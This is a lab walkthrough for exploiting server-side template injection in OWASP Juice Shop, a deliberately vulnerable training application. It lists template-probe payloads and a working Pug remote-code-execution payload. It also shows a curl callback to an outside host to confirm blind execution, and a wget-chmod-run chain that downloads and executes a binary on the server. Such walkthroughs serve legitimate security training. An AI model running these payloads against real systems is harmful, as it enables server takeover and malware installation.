# Server-Side Template Injection (SSTI)

Target - [Juice Shop](https://github.com/juice-shop/juice-shop)

Server-side template injection occurs when user input is unsafely embedded into a server-side template, allowing users to inject template directives. Using malicious template directives, an attacker may be able to execute arbitrary code and take full control of the web server.

**Assumption:** JuiceShop application is up and running. It can be accessed by visiting the URL [http://localhost:3000](http://localhost:3000)

```bash
docker run -itd --rm -p 3000:3000 --name juiceshop bkimminich/juice-shop
```

## Steps:

1. Navigate to http://localhost:3000/
2. Register a new user account (e.g., `ssrf@test.com`) and login.
3. In the top navigation menu, click on "Account" and select your email address (in this case `ssrf@test.com`) to view the "User Profile" page.
4. In the "Username" input field, enter a username and click on "Set Username" button.
5. Notice that a POST request is made to the endpoint http://127.0.0.1:3000/profile

    ```http
    POST /profile HTTP/1.1
    Host: 127.0.0.1:3000
    Content-Length: 82
    ...

    username=mirage
    ```

6. Notice that the parameter "username" accepts arbitrary values, and that this user-provided data is dynamically rendered on the "User Profile" page. Try following payloads:

    ```text
    #{7*7}
    !{7*7}
    *{7*7}
    <%= 7*7 %>
    ${7*7}
    {{7*7}}
    {{7*'7'}}
    ${{7*7}}
    ```
7. Did you find a payload that causes the expression `7*7` to get evaluated as `49`? If yes, identify the template engine being used. This will allow us to prepare template engine-specific payloads.
8. Go to the public GitHub repository of [OWASP Juice Shop](https://github.com/juice-shop/juice-shop) and analyze the code. 
    * Open ["views" folder](https://github.com/juice-shop/juice-shop/tree/master/views). Notice the file extension for `userProfile.pug` file.
    * Open `package.json` file and scroll down to the `dependencies` section. Notice the following entry: `"pug": "^3.0.0"`
9. In Google, search for the keyword `"pug": "^3.0.0"`. The first search result led me to a page (https://security.snyk.io/package/npm/pug/3.0.0) which clearly says that all PUG versions less than 3.0.1 are vulnerable. It also says that the vulnerability can allow an attacker to achieve remote code execution (RCE) on the node.js backend.
10. In Google, search for the keyword `pug remote code execution`. In a few clicks, I successfully reached the following GitHub page that provides a proof of concept (PoC) - https://github.com/pugjs/pug/issues/3312

    ```url
    http://localhost:5000/?p=');process.mainModule.constructor._load('child_process').exec('whoami');_=('
    ```

11. Customize the above PoC and use it in the "Username" field of "User Profile" page in Juice Shop application.

    ```node
    #{process.mainModule.constructor._load('child_process').exec('whoami')}
    ```

    ```http
    POST /profile HTTP/1.1
    Host: 127.0.0.1:3000
    Content-Length: 102
    ...

    username=%23%7Bprocess.mainModule.constructor._load%28%27child_process%27%29.exec%28%27whoami%27%29%7D
    ```

    The "Username" value gets displayed as `[object Object]`, indicating that the code was executed successfully, even though we couldn't view the execution results. It appears to be a **blind remote code execution** vulnerability.

12. Start a local server by running the command `python3 -m http.server 1234`, and send the following payload (after ensuring that the correct IP address of the server has been mentioned):

    ```node
    #{process.mainModule.constructor._load('child_process').exec('curl http://192.168.0.XYZ:1234')}
    ```

    Notice the local server logs to confirm that the command indeed got executed successfully.

    ```bash
    % python3 -m http.server 1234
    Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
    192.168.0.107 - - [30/Jul/2023 06:59:39] "GET / HTTP/1.1" 200 -
    ```

13. Try below payload (at your own risk), and check the Juice Shop server logs.

    ```node
    #{process.mainModule.constructor._load('child_process').exec('wget -O malware https://github.com/juice-shop/juicy-malware/raw/master/juicy_malware_macos_64 && chmod +x malware && ./malware')}
    ```

    ```log
    info: Solved 6-star sstiChallenge (SSTi)
    ```
